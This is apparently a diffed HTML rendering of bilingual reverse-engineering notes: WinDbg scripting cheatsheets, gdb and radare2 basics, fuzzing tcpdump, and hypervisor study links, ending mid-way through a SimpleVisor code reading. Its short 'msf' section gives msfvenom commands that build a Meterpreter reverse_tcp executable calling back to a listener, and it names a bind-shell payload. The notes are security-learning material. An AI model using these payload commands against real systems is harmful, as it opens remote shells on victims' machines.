+<tr><td align="left">Create a &quot;lambda&quot; inline function</td><td><code>dx @$my_function = ([arg0, arg1] =&gt; Code)</code></td><td><code> dx @$add = (x, y =&gt; x + y)</code></td></tr>
+<tr><td align="left">Filtering objects</td><td><code>[Object].Where( [FILTER PATTERN] )</code></td><td><code>dx @$cursession.Processes.Where( x =&gt; x.Name == &quot;notepad.exe&quot;)</code></td></tr>
+<tr><td align="left">Sorting objects</td><td>- asc: <code>[Object].OrderBy([Sort Expression])</code><br>- desc: <code>[Object].OrderByDescending([Sort Expression])</code><br></td><td><code>dx @$cursession.Processes.OrderByDescending(x =&gt; x.KernelObject.UniqueProcessId)</code></td></tr>
+<tr><td align="left">Projecting</td><td><code>.Select( [PROJECTION KEYS] )</code></td><td><code>.Select( p =&gt; new { Item1 = p.Name, Item2 = p.Id } )</code></td></tr>
+<tr><td align="left">Access <code>n-th</code> element of <code>iterable</code></td><td><code>$Object[n]</code></td><td><code>@$cursession.Processes[4]</code></td></tr>
+<tr><td align="left">Get the number of objects in <code>iterable</code></td><td><code>$Object.Count()</code></td><td><code>@$cursession.Processes.Count()</code></td></tr>
+<tr><td align="left">Create a iterator from a <code>LIST_ENTRY</code> structure</td><td><code>dx Debugger.Utility.Collections.FromListEntry(Address, TypeAsString, &quot;TypeMemberNameAsString&quot;)</code></td><td><code>dx @$ProcessList = Debugger.Utility.Collections.FromListEntry( *(nt!_LIST_ENTRY*)&amp;(nt!PsActiveProcessHead), &quot;nt!_EPROCESS&quot;, &quot;ActiveProcessLinks&quot;)</code> <br><code>dx @$HandleList = Debugger.Utility.Collections.FromListEntry( *(nt!_LIST_ENTRY*)&amp;(nt!PspCidTable), &quot;nt!_HANDLE_TABLE&quot;, &quot;HandleTableList&quot;)</code></td></tr>
+<tr><td align="left">Apply a structure <code>S</code> to memory (<code>dt</code>-like)</td><td><code>dx (S*)0xAddress</code></td><td><code>dx (nt!_EPROCESS*)&amp;@$curprocess.KernelObject</code></td></tr>
+<tr><td align="left">Format output data</td><td><code>dx &lt;LinqObject&gt;.ToDisplayString($format)</code> <br>where <code>$format</code> can be <ul><li><code>d</code> → decimal</li><li><code>x</code> → hexadecimal</li><li><code>o</code> → octal</li><li><code>b</code> → binary</li><li><code>s(b)</code> → char string</li> <li><code>su(b)</code> → wide-char string</li></ul></td><td><code>dx @$peb-&gt;ProcessParameters-&gt;ImagePathName.Buffer.ToDisplayString(&quot;su&quot;</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h2 id="windbg-javascript-reference"><a class="header" href="#windbg-javascript-reference">WinDbg JavaScript reference</a></h2>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Print message</td><td><code>host.diagnostics.debugLog(Message)</code></td><td></td></tr>
+<tr><td align="left">Read data from memory</td><td><code>host.memory.readMemoryValues(0xAddr, Length)</code></td><td></td></tr>
+<tr><td align="left">Read string from memory</td><td><code>host.memory.readString(0xAddr)</code><br><code>host.memory.readWideString(0xAddr)</code></td><td></td></tr>
+<tr><td align="left">Evaluate expression</td><td><code>host.evaluateExpression([EXPR])</code></td><td><code>var res=host.evaluateExpression(&quot;sizeof(_LIST_ENTRY)&quot;)</code><br><code>dx @$scriptContents.host.evaluateExpression(&quot;sizeof(_LIST_ENTRY)&quot;)</code></td></tr>
+<tr><td align="left">Resolve symbol</td><td><code>host.getModuleSymbolAddress(mod, sym)</code></td><td><code>var pRtlAllocateHeap = host.getModuleSymbolAddress('ntdll', 'RtlAllocateHeap');</code></td></tr>
+<tr><td align="left">Dereference a pointer as an object</td><td><code>host.createPointerObject(...).dereference()</code></td><td><code>var pPsLoadedModuleHead = host.createPointerObject(host.getModuleSymbolAddress(&quot;nt&quot;, &quot;PsLoadedModuleList&quot;), &quot;nt&quot;, &quot;_LIST_ENTRY *&quot;);</code></td></tr>
+<tr><td align="left">Create typed variable from address</td><td><code>host.createTypedObject(addr, module, symbol)</code></td><td><code>var loader_data_entry = host.createTypedObject(0xAddress,&quot;nt&quot;,&quot;_LDR_DATA_TABLE_ENTRY&quot;)</code></td></tr>
+<tr><td align="left">Dereference memory</td><td><code>host.evaluateExpression('(int*)0xADDRESS').dereference()</code></td><td></td></tr>
+<tr><td align="left">Get access to the Pseudo-Registers</td><td><code>host.namespace.Debugger.State.PseudoRegisters</code></td><td><code>var entrypoint = host.namespace.Debugger.State.PseudoRegisters.General.exentry.address;</code></td></tr>
+<tr><td align="left">Execute WinDbg command</td><td><code>host.namespace.Debugger.Utility.Control.ExecuteCommand</code></td><td><code>var modules=host.namespace.Debugger.Utility.Control.ExecuteCommand(&quot;lm&quot;);</code></td></tr>
+<tr><td align="left">Set Breakpoint</td><td><code>host.namespace.Debugger.Utility.Control.SetBreakpointAtSourceLocation</code><br><code>host.namespace.Debugger.Utility.Control.SetBreakpointAtOffset</code><br><code>host.namespace.Debugger.Utility.Control.SetBreakpointForReadWrite</code></td><td></td></tr>
+<tr><td align="left">Iterate through <code>LIST_ENTRY</code>s</td><td><code>host.namespace.Debugger.Utility.Collections.FromListEntry()</code></td><td><code>var process_iterator = host.namespace.Debugger.Utility.Collections.FromListEntry( pAddrOfPsActiveProcessHead, &quot;nt!_EPROCESS&quot;, &quot;ActiveProcessLinks&quot;)</code></td></tr>
+</tbody></table>
+<h3 id="dealing-with-hostint64"><a class="header" href="#dealing-with-hostint64">Dealing with <code>host.Int64</code></a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Create/Convert an <code>Int64</code> object</td><td><code>host.parseInt64('value')</code><br><code>host.parseInt64('value', 16 )</code></td><td><code>host.parseInt64('42');</code><br><code>host.parseInt64('0x1337', 16);</code></td></tr>
+<tr><td align="left">Add / Subtract</td><td><code>[Int64Obj].add($int)</code><br><code>[Int64Obj].subtract($int)</code></td><td><code>var NextPage = BasePage.add(0x1000);</code><br> <code>var NextPage = BasePage.subtract(0x1000);</code></td></tr>
+<tr><td align="left">Multiply / Divide</td><td><code>[Int64Obj].multiply($int)</code><br><code>[Int64Obj].divide($int)</code></td><td></td></tr>
+<tr><td align="left">Compare</td><td><code>[Int64Obj1].compareTo([Int64Obj2])</code></td><td><code>BasicBlock.StartAddress.compareTo(Address1) &lt;= 0</code></td></tr>
+<tr><td align="left">Bitwise operation</td><td>and: <code>[Int64Obj].bitwiseAnd($int)</code><br>or: <code>[Int64Obj].bitwiseOr($int)</code><br>xor: <code>[Int64Obj].bitwiseXor($int)</code><br>lsh: <code>[Int64Obj].bitwiseShiftLeft($shift)</code><br>rsh: <code>[Int64Obj].bitwiseShiftRight($shift)</code></td><td><code>var PageBase = Address.bitwiseAnd(0xfffff000);</code><br><code>Address.bitwiseShiftLeft(12).bitwiseShiftRight(12);</code></td></tr>
+<tr><td align="left">Convert <code>Int64</code> to native number</td><td>- with exception if precision loss: <code>[Int64Obj].asNumber()</code><br>- no exception if precision loss: <code>[Int64Obj].convertToNumber()</code></td><td></td></tr>
+</tbody></table>
+<h3 id="windbg-gallery-skeleton"><a class="header" href="#windbg-gallery-skeleton">WinDbg gallery skeleton</a></h3>
+<p>Only 3 files are needed (see [5] for more details):</p>
+<ul>
+<li><code>config.xml</code></li>
+</ul>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Settings Version=&quot;1&quot;&gt;
+  &lt;Namespace Name=&quot;Extensions&quot;&gt;
+    &lt;Setting Name=&quot;ExtensionRepository&quot; Type=&quot;VT_BSTR&quot; Value=&quot;Implicit&quot;&gt;&lt;/Setting&gt;
+    &lt;Namespace Name=&quot;ExtensionRepositories&quot;&gt;
+      &lt;Namespace Name=&quot;My Awesome Gallery&quot;&gt;
+        &lt;Setting Name=&quot;Id&quot; Type=&quot;VT_BSTR&quot; Value=&quot;any-guid-will-do&quot;&gt;&lt;/Setting&gt;
+        &lt;Setting Name=&quot;LocalCacheRootFolder&quot; Type=&quot;VT_BSTR&quot; Value=&quot;\absolute\path\to\the\xmlmanifest\directory&quot;&gt;&lt;/Setting&gt;
+        &lt;Setting Name=&quot;IsEnabled&quot; Type=&quot;VT_BOOL&quot; Value=&quot;true&quot;&gt;&lt;/Setting&gt;
+      &lt;/Namespace&gt;
+    &lt;/Namespace&gt;
+  &lt;/Namespace&gt;
+&lt;/Settings&gt;
+</code></pre>
+<ul>
+<li><code>ManifestVersion.txt</code></li>
+</ul>
+<pre><code>1
+1.0.0.0
+1
+</code></pre>
+<ul>
+<li><code>Manifest.X.xml</code> (where <code>X</code> is the version number, let's just use <code>1</code> so it is <code>Manifest.1.xml</code>)</li>
+</ul>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;ExtensionPackages Version=&quot;1.0.0.0&quot; Compression=&quot;none&quot;&gt;
+  &lt;ExtensionPackage&gt;
+    &lt;Name&gt;Script1&lt;/Name&gt;
+    &lt;Version&gt;1.0.0.0&lt;/Version&gt;
+    &lt;Description&gt;Description of Script1.&lt;/Description&gt;
+    &lt;Components&gt;
+      &lt;ScriptComponent Name=&quot;Script1&quot; Type=&quot;Engine&quot; File=&quot;.\relative\path\to\Script1.js&quot; FilePathKind=&quot;RepositoryRelative&quot;&gt;
+        &lt;FunctionAliases&gt;
+          &lt;FunctionAlias Name=&quot;AliasCreatedByScript`&quot;&gt;
+            &lt;AliasItem&gt;
+              &lt;Syntax&gt;&lt;![CDATA[!AliasCreatedByScript]]&gt;&lt;/Syntax&gt;
+              &lt;Description&gt;&lt;![CDATA[Quick description of AliasCreatedByScript.]]&gt;&lt;/Description&gt;
+            &lt;/AliasItem&gt;
+          &lt;/FunctionAlias&gt;
+        &lt;/FunctionAliases&gt;
+      &lt;/ScriptComponent&gt;
+    &lt;/Components&gt;
+  &lt;/ExtensionPackage&gt;
+&lt;/ExtensionPackages&gt;
+</code></pre>
+<p>Then in WinDbg load &amp; save:</p>
+<pre><code>0:000&gt; .settings load \path\to\config.xml
+0:000&gt; .settings save
+</code></pre>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h2 id="time-travel-debugging"><a class="header" href="#time-travel-debugging">Time-Travel Debugging</a></h2>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">DDM Objects</td><td><code>@$curprocess.TTD</code><br><code>@$cursession.TTD</code></td><td><code>dx @$curprocess.TTD.Threads.First().Lifetime</code> <br> <code>dx @$cursession.TTD.Calls(&quot;ntdll!Nt*File&quot;).Count()</code></td></tr>
+<tr><td align="left">Run execution back</td><td><code>g-</code></td><td></td></tr>
+<tr><td align="left">Reverse Step Over</td><td><code>p-</code></td><td></td></tr>
+<tr><td align="left">Reverse Step Into</td><td><code>t-</code></td><td></td></tr>
+<tr><td align="left">Regenerate the index</td><td><code>!ttdext.index</code></td><td></td></tr>
+<tr><td align="left">Jump to position <code>XX:YY</code> (WinDbg)</td><td><code>!tt XX:YY</code></td><td><code>!tt 1B:0</code></td></tr>
+<tr><td align="left">Jump to position <code>XX:YY</code> (DDM)</td><td><code>&lt;TtdPosition&gt;.SeekTo()</code></td><td><code>dx @$curprocess.TTD.Lifetime.MinPosition.SeekTo()</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h2 id="additional-resources"><a class="header" href="#additional-resources">Additional resources</a></h2>
+<ol>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-printf#syntax-elements">WinDbg .printf formatters</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/javascript-debugger-scripting">JavaScript Debugger Scripting</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax#automatic-pseudo-registers">WinDbg Pseudo-Register Syntax</a></li>
+<li><a href="https://www.youtube.com/watch?v=d5Xr6oqu_ac&amp;list=PLjAuO31Rg973XOVdi5RXWlrC-XlPZelGn">WinDbg Playlist on YouTube</a></li>
+<li><a href="https://github.com/microsoft/WinDbg-Samples/tree/master/Manifest">WinDbg Extension Gallery</a></li>
+<li><a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/sos-dll-sos-debugging-extension">SOS commands for .NET debugging</a></li>
+</ol>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="调用规约"><a class="header" href="#调用规约">调用规约</a></h1>
+<ul>
+<li>
+<p>Linux x64：</p>
+<ul>
+<li>TLDR: rdi, rsi, rdx, rcx, r8, r9</li>
+<li>User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9. <a href="https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f">link</a></li>
+</ul>
+</li>
+<li>
+<p>Windows x64:</p>
+<ul>
+<li>rcx, rdx, r8, r9, then stack</li>
+<li>https://docs.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=vs-2019</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-c++">func1(int a, int b, int c, int d, int e, int f);
+// a in RCX, b in RDX, c in R8, d in R9, f then e pushed on stack
+</code></pre>
+<ul>
+<li>Windows x86:
+<ul>
+<li>esp+4, esp+8</li>
+</ul>
+</li>
+</ul>
+<h1 id="r2-radare2"><a class="header" href="#r2-radare2">r2 (radare2)</a></h1>
+<ul>
+<li><code>aaaa</code> 分析</li>
+<li><code>afl</code> 列出函数
+<ul>
+<li><code>afl~main</code> 列出包含 main 的函数</li>
+</ul>
+</li>
+<li><code>s main</code> 切换(seek)当前地址为 main</li>
+<li><code>pdf</code> 打印当前的汇编</li>
+<li>任意命令加 <code>?</code> 提供 help 信息，比如 <code>pd?</code></li>
+</ul>
+<h1 id="gdb"><a class="header" href="#gdb">gdb</a></h1>
+<ul>
+<li>r 运行，run</li>
+<li>c 继续，continue</li>
+<li>info reg 查看寄存器</li>
+<li>br *main 在main函数下断点</li>
+<li>br src/ss.c:123 在文件 ss.c:123 处下断点</li>
+<li>del 1 删除断点1</li>
+<li>diable 1 禁用断点1</li>
+<li>enable 1 启用断点1</li>
+<li>info br 查看断点</li>
+<li>x/4gx 0xdeadbeef 检查内存
+<ul>
+<li>x/4wx 控制每行的列数</li>
+<li>x/2wx $rax </li>
+</ul>
+</li>
+<li>x/10i $pc 打印当前汇编
+<ul>
+<li>x/10i $rip rip/eip/pc都可以</li>
+<li>x/-10i $rip 可以倒着来</li>
+</ul>
+</li>
+<li>n(next) 源码级别step over</li>
+<li>s(step) 源码级别step in</li>
+<li>si(stepi) 汇编级别step in</li>
+<li>ni(nexti) 汇编级别step over</li>
+<li>starti 开始时断下（找不到入口/entry时）</li>
+</ul>
+<ul>
+<li><a href="https://lldb.llvm.org/use/map.html">gdb和lldb的对比</a></li>
+<li><a href="https://sourceware.org/gdb/onlinedocs/gdb/">gdb online docs</a></li>
+</ul>
+<h1 id="windbg"><a class="header" href="#windbg">windbg</a></h1>
+<ul>
+<li><code>sxe ld:xx.dll</code> dll加载时断下</li>
+<li><code>* blabla</code> 注释</li>
+<li><code>u $exentry</code> 查看入口/entry</li>
+<li><code>x ntdll!D*</code> 查看符号</li>
+<li><code>p</code> step over</li>
+<li><code>t</code> (trace) step into</li>
+</ul>
+<h2 id="windbg-basic"><a class="header" href="#windbg-basic">windbg basic</a></h2>
+<ul>
+<li><code>g</code> 运行</li>
+<li><code>r</code> 查看所有寄存器
+<ul>
+<li><code>r rax</code> 查看 rax</li>
+</ul>
+</li>
+<li><code>u</code> 查看当前eip的反汇编</li>
+<li>直接按回车执行上一条命令</li>
+<li>分号做分割，可以在一行执行多条命令</li>
+<li><code>ctrl + break</code> 强制停止命令</li>
+</ul>
+<p>windbg中有一些伪寄存器，最常见的就是memory界面默认显示的 <code>@$scopeip</code>，表示当前 eip</p>
+<p>有如下这些常用伪寄存器，完整列表见<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax">官网</a></p>
+<table><thead><tr><th>pseudo register</th><th>desc</th></tr></thead><tbody>
+<tr><td><code>$exentry</code></td><td>入口点</td></tr>
+<tr><td><code>$proc</code></td><td>进程结构(EPROCESS)指针</td></tr>
+<tr><td><code>$peb</code></td><td>进程PEB(process environment block)结构</td></tr>
+<tr><td><code>$teb</code></td><td>进程TEB(thread environment block)结构</td></tr>
+</tbody></table>
+<h3 id="执行"><a class="header" href="#执行">执行</a></h3>
+<p><code>p</code> 命令：</p>
+<pre><code>[~Thread] p[r] [= StartAddress] [Count] [&quot;Command&quot;] 
+</code></pre>
+<ul>
+<li>加 <code>r</code> 禁止寄存器显示</li>
+<li>默认从 eip 开始执行，加 <code>= StartAddress</code> 从该地址开始执行</li>
+<li>加 <code>Count</code> 表示执行的行数或者指令数（？如何区分），默认是 1
+<ul>
+<li>切换汇编模式：<code>l-t</code></li>
+<li>切换源码模式：<code>l+t</code> （更多：<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/l---l---set-source-options-">l+,l-指令文档</a>）</li>
+</ul>
+</li>
+<li>加 <code>&quot;Command&quot;</code> 表示指令数执行完后需要执行的命令</li>
+</ul>
+<p>t命令和p命令类似，区别是：t是step in，p是step over</p>
+<ul>
+<li><code>pa|ta [r] [=StartAddress] StopAddress</code> 执行到指定地址</li>
+<li><code>pc|tc [r] [=StratAddress] [Count]</code> 执行到下一个函数调用</li>
+<li><code>tb [r] [=StartAddress] [Count]</code> 执行到下一个分支</li>
+</ul>
+<h3 id="断点"><a class="header" href="#断点">断点</a></h3>
+<pre><code>bp[ID] [Options] [Address [Passes]] [&quot;Command String&quot;]
+bu[ID] [Options] [Address [Passes]] [&quot;Command String&quot;]
+bm[Options]  SymbolPattern [Passes] [&quot;Command String&quot;]
+
+; 硬件断点
+ba [ID] Access Size [Option] [Address[Passes]] [&quot;Command String&quot;]
+</code></pre>
+<ul>
+<li><code>bp</code> 软件断点</li>
+<li><code>ba</code> 硬件断点
+<ul>
+<li><code>ba r1 0x401000</code> 读0x401000 &gt;= 1bytes</li>
+</ul>
+</li>
+<li><code>bu</code> 未加载模块断点</li>
+<li><code>bm</code> 符号特征断点 (Set Symbol Breakpoint)
+<ul>
+<li><code>bm msvcr80d!print*</code></li>
+</ul>
+</li>
+<li><code>bl</code> 列举断点</li>
+<li><code>bc</code> 清除断点</li>
+<li><code>bd/be</code> 禁用/启用断点</li>
+</ul>
+<p>TODO: 条件断点</p>
+<h3 id="栈回溯"><a class="header" href="#栈回溯">栈回溯</a></h3>
+<h2 id="more-to-learn"><a class="header" href="#more-to-learn">more to learn</a></h2>
+<ul>
+<li>https://medium.com/@yardenshafir2/windbg-the-fun-way-part-1-2e4978791f9b new way</li>
+<li>https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html log</li>
+<li>https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md must memorize</li>
+<li>https://bbs.pediy.com/thread-250670.htm</li>
+</ul>
+<h1 id="msf"><a class="header" href="#msf">msf</a></h1>
+<p>shellcode</p>
+<pre><code class="language-sh">msfvenom -p windows/x64/exec CMD=calc.exe   -a x64 --platform win -f raw -o calc64.raw
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.11 LPORT=1111 -f exe &gt; shell.exe
+
+# 常用payload
+payload/windows/x64/meterpreter_bind_tcp
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="winafl"><a class="header" href="#winafl">winafl</a></h1>
+<h1 id="honggfuzz"><a class="header" href="#honggfuzz">honggfuzz</a></h1>
+<p>google开源的fuzz，多进程多线程</p>
+<p>git clone https://github.com/google/honggfuzz</p>
+<p>sudo apt install binutils-dev libunwind-dev
+make
+sudo make install</p>
+<p>hfuzz-gcc</p>
+<p>hfuzz-gcc imgRead.c -o imgRead</p>
+<ul>
+<li>honggfuzz 主fuzz程序</li>
+</ul>
+<pre><code class="language-sh">Examples:
+ Run the binary over a mutated file chosen from the directory. Disable fuzzing feedback (static mode):
+  honggfuzz -i input_dir -x -- /usr/bin/djpeg ___FILE___ # -x 没有插桩、反馈
+ As above, provide input over STDIN:
+  honggfuzz -i input_dir -x -s -- /usr/bin/djpeg
+ Use compile-time instrumentation (-fsanitize-coverage=trace-pc-guard,...):
+  honggfuzz -i input_dir -- /usr/bin/djpeg ___FILE___ # 有插桩，需要前提是用hfuzz-gcc编译过的？
+ Use persistent mode w/o instrumentation:
+  honggfuzz -i input_dir -P -x -- /usr/bin/djpeg_persistent_mode # -P persistent fuzzing？？ 什么意思
+ Use persistent mode and compile-time (-fsanitize-coverage=trace-pc-guard,...) instrumentation:
+  honggfuzz -i input_dir -P -- /usr/bin/djpeg_persistent_mode
+</code></pre>
+<p>honggfuzz -i input/ -- ./imgRead <strong>FILE</strong></p>
+<ul>
+<li>persistent fuzz <a href="https://github.com/google/honggfuzz/blob/master/docs/PersistentFuzzing.md">文档</a>
+对单个api进行fuzz，有两种方式：</li>
+</ul>
+<ol>
+<li>定义<code>int LLVMFuzzerTestOneInput(uint8_t *buf, size_t len)</code>函数，在这里面调用api</li>
+<li>在程序中获取输入（比如循环读用户输入）的地方用<code>HF_ITER(&amp;buf, &amp;len);</code>来获取fuzzer喂来的数据</li>
+</ol>
+<p>这种模式集中了fuzz的火力，速度当然非常快。</p>
+<h1 id="afl-fuzz-tcpdump"><a class="header" href="#afl-fuzz-tcpdump">afl fuzz tcpdump</a></h1>
+<pre><code class="language-sh">git clone https://github.com/the-tcpdump-group/tcpdump
+cd tcpdump
+./configure  # failed
+
+# install libpcap
+git clone https://github.com/the-tcpdump-group/libpcap
+
+sudo apt install flex bison -y
+cd libpcap &amp;&amp; ./configure 
+
+# 这里为什么要给两次fsanitize，值还不一样？？？
+CC=afl-clang CFLAGS=&quot;-g -fsanitize=address -fsanitize=undefined -fno-omit-frame-pointer&quot; LDFLAGS=&quot;-g -fsanitize-address -fsanitize=undefined -fno-omit-frame-pointer&quot; ./configure
+
+make
+sudo make install
+
+# finish install libpcap
+cd ..
+CC=afl-clang CFLAGS=&quot;-g -fsanitize=address -fsanitize=undefined -fno-omit-frame-pointer&quot; LDFLAGS=&quot;-g -fsanitize-address -fsanitize=undefined -fno-omit-frame-pointer&quot; ./configure
+make
+sudo make install
+</code></pre>
+<p>tcpdump 能处理.pcap文件，这是fuzz的点，很容易就值想到他能抓包而束手无策</p>
+<p>精简corpus，tests文件夹下往往有样本可用</p>
+<pre><code>afl-cmin -i tests/ -o testsmain -m none -- ./tcpdump -vv -ee -nnr @@
+</code></pre>
+<p>开搞</p>
+<pre><code>afl-fuzz -i testsmin/ -o tcpdumpfuzz -m none -- ./tcpdump -vv -ee -nnr @@
+</code></pre>
+<h2 id="如果用honggfuzz"><a class="header" href="#如果用honggfuzz">如果用honggfuzz</a></h2>
+<p>https://youtu.be/9jqg7T3Ltn4</p>
+<ol>
+<li>
+<p>编译阶段
+CC=hfuzz 。。。</p>
+</li>
+<li>
+<p>~精简~, 不精简还是hgfuzz自带？？</p>
+</li>
+</ol>
+<p>honggfuzz -i tests -- ./tcpdump -vv -ee -nnr <em><strong>FILE</strong></em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vt"><a class="header" href="#vt">vt</a></h1>
+<h1 id="links"><a class="header" href="#links">links</a></h1>
+<p>related repos:</p>
+<ul>
+<li><a href="https://github.com/ionescu007/SimpleVisor">SimpleVisor</a> VT-x hypervisor works on Windows and UEFI by ionescu007, “中心节点”之一, 
+<ul>
+<li><a href="./SimpleVisorRead.html">源码阅读</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/tandasat/HyperPlatform">HyperPlatform</a> VM-exit filtering platform ；“中心节点” 之一</li>
+<li><a href="https://github.com/Kelvinhack/kHypervisor">kHypervisor</a> capable for nested virtualization in Windows x64 platform, 基于 HyperPlatform；</li>
+<li><a href="https://github.com/ParkHanbum/HypervisorKeylogger">HypervisorKeylogger</a> korean; 单文件vt、在xp上测试成功；</li>
+<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSysExtremeVulnerableDriver</a> Vulnerable Driver; 提供编译好的sys, .sln编译有问题</li>
+<li><a href="https://github.com/Gbps/gbhv">gbhv</a> 专注于 EPT hooking; README值得看； <em>#checkme</em></li>
+<li><a href="https://github.com/gamozolabs/chocolate_milk">chocolate_milk: Pure Rust x86_64 bootloader and kernel</a> 常看常新</li>
+<li><a href="https://blog.talosintelligence.com/2020/08/barbervisor.html">barbervisor</a> for fuzz</li>
+<li><a href="https://github.com/HyperDbg/HyperDbg">HyperDbg</a> for debug | 貌似和 hypervisor-from-scratch 系列文章有关</li>
+<li><a href="https://github.com/zzhouhe/VT_Learn">VT_Learn</a> VT技术入门; 在xp上测试成功</li>
+</ul>
+<p>tutorials:</p>
+<ul>
+<li>
+<p>hypervisor development series:</p>
+<ul>
+<li><a href="https://revers.engineering/day-0-virtual-environment-setup-scripts-and-windbg/">https://revers.engineering/day-0-virtual-environment-setup-scripts-and-windbg/</a></li>
+<li><a href="https://revers.engineering/day-1-introduction-to-virtualization/">https://revers.engineering/day-1-introduction-to-virtualization/</a></li>
+<li><a href="https://revers.engineering/day-2-entering-vmx-operation/">https://revers.engineering/day-2-entering-vmx-operation/</a></li>
+<li><a href="https://revers.engineering/day-3-multiprocessor-initialization-error-handling-the-vmcs/">https://revers.engineering/day-3-multiprocessor-initialization-error-handling-the-vmcs/</a></li>
+<li><a href="https://revers.engineering/day-4-vmcs-segmentation-ops">https://revers.engineering/day-4-vmcs-segmentation-ops</a></li>
+<li><a href="https://revers.engineering/day-5-vmexits-interrupts-cpuid-emulation/">https://revers.engineering/day-5-vmexits-interrupts-cpuid-emulation/</a></li>
+</ul>
+</li>
+<li>
+<p>hypervisor from scratch series:</p>
+<ul>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-1/">Part 1: Basic Concepts &amp; Configure Testing Environment</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-2/">Part 2: Entering VMX Operation</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-3/">Part 3: Setting up Our First Virtual Machine</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-4/">Part 4: Address Translation Using Extended Page Table (EPT)</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-5/">Part 5: Setting up VMCS &amp; Running Guest Code</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-6/">Part 6: Virtualizing An Already Running System</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-7/">Part 7: Using EPT &amp; Page-Level Monitoring Features</a></li>
+<li><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-8/">Part 8: How To Do Magic With Hypervisor!</a></li>
+</ul>
+</li>
+<li>
+<p>VT技术入门 <a href="https://space.bilibili.com/37877654/">https://space.bilibili.com/37877654/</a></p>
+<ul>
+<li><a href="https://www.bilibili.com/video/BV1hb411i7Hj">VT技术入门01_资源和基础</a></li>
+<li><a href="https://www.bilibili.com/video/BV1cb411e7oU">VT技术入门02_混合编译配置</a></li>
+<li><a href="https://www.bilibili.com/video/BV1Eb411e7U9">VT技术入门03_支持检测</a></li>
+<li><a href="https://www.bilibili.com/video/BV1vb411e7LS">VT技术入门04_VMXON</a></li>
+<li><a href="https://www.bilibili.com/video/BV1Pb411v78s">VT技术入门05_VMCS(1)</a></li>
+<li><a href="https://www.bilibili.com/video/BV1ob411n7jr">VT技术入门06_VMCS(2)</a></li>
+<li><a href="https://www.bilibili.com/video/BV1fb411n7GT">VT技术入门07_VMCS(3)</a></li>
+<li><a href="https://www.bilibili.com/video/BV1Gb411H7UW">VT技术入门08_调试技巧</a></li>
+<li><a href="https://www.bilibili.com/video/BV1mb411H7LX">VT技术入门09_VM-Exit_handler</a></li>
+<li><a href="https://www.bilibili.com/video/BV1fb411H73R">VT技术入门10_EPT物理地址转换</a></li>
+<li><a href="https://www.bilibili.com/video/BV1mb411J7Wu">VT技术入门11_非PAE下的EPT开启</a></li>
+<li><a href="https://www.bilibili.com/video/BV15b411n72U">VT技术入门12_PAE下的EPT开启</a></li>
+<li><a href="https://www.bilibili.com/video/BV1Hb411n7Mw">VT技术入门13_应用举例</a></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="source-code-read-simplevisor--a-hrefvthtmlpinback-vta"><a class="header" href="#source-code-read-simplevisor--a-hrefvthtmlpinback-vta">Source Code Read: SimpleVisor  <a href="./vt.html">Pinback: vt</a></a></h1>
+<p>从驱动入口 DriverEntry 开始读：</p>
+<p>首先做了一个 power state callback，之后加载 hypervisor</p>
+<p>hypervisor 加载的逻辑在函数 ShvLoad 中，剩下的阅读都从这个函数出发。</p>
+<p>首先需要让所有的 LP（Logic Processor） 进入 VMX root 模式</p>
+<pre><code class="language-c++">ShvLoad
+	ShvOsRunCallbackOnProcessors(ShvVpLoadCallback, &amp;callbackContext);
+		KeGenericCallDpc // callback
+			ShvOsDpcRoutine // callback
+				ShvVpLoadCallback // 在这个函数中cpu 被 hyperjacked，~返回后就是unload和清理了~
+				// do cleanup:
+				// ShvVmxCleanup, KeSignalCallDpcSynchronize, KeSignalCallDpcDone
+				
+				
+
+
+ShvVpLoadCallback
+	ShvVmxProbe // 检查 VMX root mode 是否支持
+	PSHV_VP_DATA vpData // 初始化vpData，代表一个~LP~的数据结构
